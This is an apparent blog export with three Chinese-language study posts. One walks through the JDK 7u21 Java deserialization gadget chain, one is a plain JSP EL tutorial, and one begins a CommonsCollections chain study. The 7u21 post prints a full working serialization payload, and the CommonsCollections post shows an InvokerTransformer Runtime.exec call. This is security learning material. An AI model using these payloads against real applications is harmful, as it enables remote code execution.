<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>7u21</title>
    <url>/2022/03/24/7u21/</url>
    <content><![CDATA[<p>首先去下载个jdk7u21<span id="more"></span></p>
<p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p>
<p>然后去下载对应版本的openjdk</p>
<p>参照这篇文章进行操作<a href="https://www.cnblogs.com/haimishasha/p/9909055.html">https://www.cnblogs.com/haimishasha/p/9909055.html</a></p>
<p>注:以下所有提到<code>templates</code>对象的地方,<code>templates</code>都指的是实例化<code>TemplatesImpl</code>并构造好的恶意类</p>
<h4 id="类分析"><a href="#类分析" class="headerlink" title="类分析"></a>类分析</h4><p><code>AnnotationInvocationHandler</code>这个类中有一个<code>equalsImpl</code>方法</p>
<p>它可以调用通过反射调用所有通过<code>getMemberMethods</code>获取到的Method数组中的method</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220324112303655.png" alt="image-20220324112303655"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!type.isInstance(o))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">            String member = memberMethod.getName();</span><br><span class="line">            Object ourValue = memberValues.get(member);</span><br><span class="line">            Object hisValue = <span class="keyword">null</span>;</span><br><span class="line">            AnnotationInvocationHandler hisHandler = asOneOfUs(o);</span><br><span class="line">            <span class="keyword">if</span> (hisHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">                hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    hisValue = memberMethod.invoke(o);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(ourValue, hisValue))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>也就是说， <code>equalsImpl</code> 这个方法是将 <code>this.type</code> 类中的所有方法遍历并执行了。那么，假设<code>this.type</code>是<code>TemplatesImpl</code>类，则势必会调用到其中的 <code>newTransformer() </code>或<code>getOutputProperties()</code>方法，进而触发任意代码执行。</p>
<h4 id="如何调用equalsImpl"><a href="#如何调用equalsImpl" class="headerlink" title="如何调用equalsImpl"></a>如何调用equalsImpl</h4><p>接下来找调用了<code>equalsImpl</code>方法的地方,因为其是private,所以一般都在本类中调用</p>
<p>在本类中的invoke方法中找到了<code>equalsImpl</code>的调用</p>
<p>这里就又涉及到了动态代理的问题</p>
<p><code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>接口,所以它只需要代理对应的类,然后调用类中的任意方法都会执行invoke方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">        String member = method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">assert</span> paramTypes.length == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;hashCode&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;annotationType&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        Object result = memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当调用的方法名为<code>equals</code>的时候,会调用<code>equalsImpl</code>方法</p>
<p>找<code>equals</code>方法调用链</p>
<p>比较Java对象的时候,常用的两个方法</p>
<ul>
<li>equals</li>
<li>compareTo</li>
</ul>
<p>任意java兑现都有<code>equals</code>方法,它通常用于比较两个对象是否是同一个引用,<code>而compareTo</code>实际上是<code>java.lang.Compareable</code>接口的方法,<code>java.util.PriorityQueue</code>中也用到过,通常被实现用于比较两个对象的值是否相等.</p>
<p>一个常见的会调用equals的场景是集合Set,Set中存储的对象不允许重复,所以在添加对象的时候,势必会涉及到比较操作.</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220324175504230.png" alt="image-20220324175504230"></p>
<p>可以把i暂且看为hashCode的单射函数,i就是对象在hash表中应该跟在哪个位置后面,当两个对象跟在同一个后面的时候,就会调用equals再次进行比较,接下来就是要让proxy对象的”i”等于templates的”i”</p>
<p>跟着P牛的逻辑</p>
<p>计算“哈希”的主要是下面这两行代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> hash = hash(key);</span><br><span class="line"><span class="keyword">int</span> i = indexFor(hash, table.length);</span><br></pre></td></tr></table></figure>

<p>将其中的关键逻辑提权出来，可以得到下面这个函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">	h ^= key.hashCode();</span><br><span class="line">	h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">	h = h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">	<span class="keyword">return</span> h &amp; <span class="number">15</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了<code>key.hashCode</code>外没有其他变量,所以proxy对象与<code>TemplateImpl</code>对象的”i”是否相等,仅仅取决于这两个对象的<code>hashCode</code>是否相等,TemplateImpl的<code>hashCode</code>是一个Native方法,每次运行都会发生变化,理论上是无法预测的,所以想让proxy的<code>hashCode</code>与之相等,只能寄希望于<code>proxy.hashCode</code></p>
<p><code>proxy.hashCode()</code> 仍然会调用到<code> AnnotationInvocationHandler#invoke</code> ，进而调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code> ，这个方法代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">            result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">                memberValueHashCode(e.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这段代码在看过p牛的解析后恍然大悟,果然是基础不牢,地动山摇,</p>
<p>最核心的一点就是很基础的<code>0异或任何数都等于该数本身</code></p>
<p>所以这个地方只需要保证<code>e.getKey().hashCode()</code>为0,那么就可以控制result为<code>memberValueHashCode(e.getValue())</code></p>
<p><code>f5a5a608</code>字符串的HashCode为0,那么就可以作为map的key放进去,从而让<code>hashCodeImpl()</code>返回的值为<code>templates</code>的hashCode,这样在后面就会触发equals方法</p>
<p>找hashCode为0的字符串脚本</p>
<p>起初是用int写的,结果太小没跑出了,怪不得每次就算+1,p牛也还是用的Long写的….</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">0</span>; i &lt; <span class="number">9999999999L</span>; i++) &#123;</span><br><span class="line">            String s=Long.toHexString(i);</span><br><span class="line">            <span class="keyword">if</span> (s.hashCode() == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Long.toHexString(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        String zeroHashCodeStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(zeroHashCodeStr, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass();</span><br><span class="line">        Field name = templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytecodes = templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\java\\unser\\7u21\\target\\test-classes\\MyClass.class&quot;</span>));</span><br><span class="line">        <span class="keyword">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactory = templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Class&lt;Templates&gt; templatesClass1 = Templates.class;</span><br><span class="line">        <span class="comment">//为templates创建代理实例proxy,调用proxy的任意方法都会调用到AnnotationInvocationHandler里面的invoke方法</span></span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)declaredConstructor.newInstance(Templates.class, map);</span><br><span class="line">        Object proxy= Proxy.newProxyInstance(test.class.getClassLoader(), templatesClass.getInterfaces(), handler);</span><br><span class="line">        HashSet hashSet = <span class="keyword">new</span> HashSet();</span><br><span class="line">        hashSet.add(templates);</span><br><span class="line">        hashSet.add(proxy);</span><br><span class="line">        map.put(zeroHashCodeStr,templates);</span><br><span class="line"></span><br><span class="line">        serialize(hashSet);</span><br><span class="line">        unserialize(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;C:\\Temp\\test.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(path));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h3><p>HashSet.readObject()—–&gt;新建一个hash链表,接着开始计算hash, proxy由于代理了<code>AnnotationInvocationHandler</code>所以调用<code>hashCode</code>会在<code>invoke</code>中走到<code>hashCodeImpl</code>方法然后这个地方的<code>memberValues</code>是之前的精心构造的map,它的key的hash结果是0,所以会返回<code>Templates</code>的hash结果,</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; e : memberValues.entrySet()) &#123;</span><br><span class="line">            result += (<span class="number">127</span> * e.getKey().hashCode()) ^</span><br><span class="line">                memberValueHashCode(e.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>于是proxy返回的hashCode和<code>Templates</code>的结果一样了,由于HashSet的特性,会调用<code>equals</code>方法,而proxy中调用<code>equals</code>方法会传入参数为<code>templates</code>作为调用到<code>equalsImpl</code>方法时<code>o</code>的值</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220325131726788.png" alt="image-20220325131726788"></p>
<p>该方法遍历并执行type中的所有方法,而type是<code>TemplatesImpl</code>的接口,它其中只包括了危险的<code>newTransformer</code>和<code>getOutputProperties</code>,而此时<code>o</code>是实例化好的templates,触发恶意代码执行,这块是CC2的知识</p>
<p>P牛的文章讲的真不错,静下心来看完收获不小呢</p>
<h5 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h5><p>画一个思维导图再加深一下理解</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220325134238553.png" alt="image-20220325134238553"></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>EL表达式学习记录</title>
    <url>/2021/09/22/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="EL表达式"><a href="#EL表达式" class="headerlink" title="EL表达式"></a>EL表达式</h1><p>EL(expression language)是为了让JSP写起来更加方便，他提供了在jsp中简化表达式的方法，让jsp的代码更加简化</p>
<h2 id="EL表达式语法"><a href="#EL表达式语法" class="headerlink" title="EL表达式语法"></a>EL表达式语法</h2><p>语法结构较为简单,就是${expression}</p>
<h2 id="域的概念"><a href="#域的概念" class="headerlink" title="域的概念"></a>域的概念</h2><p>域对象的概念在jsp中共有4中,分别是<code>pageContext,request,session,application</code>  范围依次是: <code>本页面 -&gt;一次请求-&gt;一次会话-&gt;整个应用程序</code></p>
<p>el表达式一般操作的都是域对象,操作不了局部变量</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL表达式&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;wangwu&quot;</span>);</span><br><span class="line">    application.setAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;zhaoliu&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">        获取作用域中username： $&#123;username&#125;&lt;br&gt;&lt;%-- 默认从小到大的范围中找，找到的第一个返回 --%&gt;</span><br><span class="line">        不在作用域中的： $&#123;password&#125;</span><br><span class="line">        &lt;%--获取request作用域中的username： $&#123;requestScope.username&#125;</span><br><span class="line">        获取session作用域中的username： $&#123;sessionScope.username&#125;</span><br><span class="line">        获取application作用域中的username： $&#123;applicationScope.username&#125;--%&gt;</span><br><span class="line">  &lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922183714222.png" alt="image-20220922183714222"></p>
<p>不在作用域中,显示为空,而不是null</p>
<h3 id="从指定范围取值-以及默认取值规则"><a href="#从指定范围取值-以及默认取值规则" class="headerlink" title="从指定范围取值,以及默认取值规则"></a>从指定范围取值,以及默认取值规则</h3><ul>
<li><p>当需要从某个特定的域对象中查找数据的时候可以使用四个域对象对应的空间对象分别为:</p>
<p><code>pageScope,requestScope,sessionScope,applicationScope</code></p>
</li>
<li><p>EL默认的查找方式为:从小到大查找,找到了即返回,若未查找到则返回空字符串</p>
</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL表达式&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">    session.setAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;wangwu&quot;</span>);</span><br><span class="line">    application.setAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;zhaoliu&quot;</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">         获取pageContext作用域中的username:  $&#123;pageScope.username&#125;</span><br><span class="line">         获取request作用域中的username： $&#123;requestScope.username&#125;</span><br><span class="line">         获取session作用域中的username： $&#123;sessionScope.username&#125;</span><br><span class="line">         获取application作用域中的username： $&#123;applicationScope.username&#125;</span><br><span class="line">  &lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922184459693.png" alt="image-20220922184459693"></p>
<h4 id="获取作用域中的集合"><a href="#获取作用域中的集合" class="headerlink" title="获取作用域中的集合"></a>获取作用域中的集合</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL表达式&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;%</span><br><span class="line">      List&lt;String&gt; list=<span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">      list.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">      list.add(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">      list.add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line">      request.setAttribute(<span class="string">&quot;list&quot;</span>,list);</span><br><span class="line">  %&gt;</span><br><span class="line">  &lt;pre&gt;</span><br><span class="line">           获取list中指定下标的数据：$&#123;list[<span class="number">1</span>]&#125;--$&#123;list[<span class="number">2</span>]&#125;</span><br><span class="line">           获取集合的长度：$&#123;list.size()&#125;</span><br><span class="line">           list代表的是存在域对象中的变量名(限域变量名)</span><br><span class="line">  &lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922184636850.png" alt="image-20220922184636850"></p>
<h4 id="获取javaBean对象"><a href="#获取javaBean对象" class="headerlink" title="获取javaBean对象"></a>获取javaBean对象</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.test.User&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL表达式&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    User user=<span class="keyword">new</span> User();</span><br><span class="line">    user.setUsername(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">    user.setSex(<span class="keyword">true</span>);</span><br><span class="line">    user.setUserId(<span class="number">1</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;user&quot;</span>,user);<span class="comment">//设置域对象属性</span></span><br><span class="line">%&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">         获取JavaBean中的username  $&#123;user.username&#125;</span><br><span class="line">         获取JavaBean中的userId    $&#123;user.userId&#125;</span><br><span class="line">         获取JavaBean中的sex       $&#123;user.sex&#125;</span><br><span class="line">  &lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922185046439.png" alt="image-20220922185046439"></p>
<h2 id="EL表达式运算"><a href="#EL表达式运算" class="headerlink" title="EL表达式运算"></a>EL表达式运算</h2><h4 id="判断是否为空"><a href="#判断是否为空" class="headerlink" title="判断是否为空"></a>判断是否为空</h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922185231903.png" alt="image-20220922185231903"></p>
<h4 id="判断是否相等"><a href="#判断是否相等" class="headerlink" title="判断是否相等"></a>判断是否相等</h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922185319138.png" alt="image-20220922185319138"></p>
<h4 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922185339887.png" alt="image-20220922185339887"></p>
<h4 id="大小比较"><a href="#大小比较" class="headerlink" title="大小比较"></a>大小比较</h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220922185400875.png" alt="image-20220922185400875"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>el表达式</tag>
        <tag>jsp</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections</title>
    <url>/2022/03/14/CommonsCollections/</url>
    <content><![CDATA[<p>实验环境</p>
<p>jdk8u65</p>
<p>commonsCollections 3.2.1</p>
<p>这个学的很吃力,但是每天都坚持,争取一周之内将其理解<span id="more"></span></p>
<hr>
<blockquote>
<p>对于InvokerTransformer的理解,在这里记录一下,防止忘记</p>
</blockquote>
<p><a href="https://app.yinxiang.com/shard/s51/nl/33688597/8bf0d8b9-d265-4a61-a2b6-5918bc38706d">https://app.yinxiang.com/shard/s51/nl/33688597/8bf0d8b9-d265-4a61-a2b6-5918bc38706d</a></p>
<p>目标是通过TransFormer接口的InvokerTransformer实现类中的transform方法实现任意类加载,</p>
<p><strong>找利用链的过程应该是逆向思维,先找到一个能接受任意参数并且能执行命令方法,然后再反着找谁调用了它,再找谁调用了调用了它的那个函数,最后找到底的并且能走通的类就是入口类????</strong></p>
<p>这是该方法的源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>通过观察该方法,发现该方法接受一个任意对象为参数,并且通过反射调用方法,方法名和参数在构造方法中可控</p>
<p>先自己写一遍自己认为的能调用exec的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>

<p>接着拓展这条调用链,找一找有没有不同名的类调用了transform方法</p>
<p>跟着教程在TransformedMap类中找到了一个checkSetValue方法中调用了transform方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

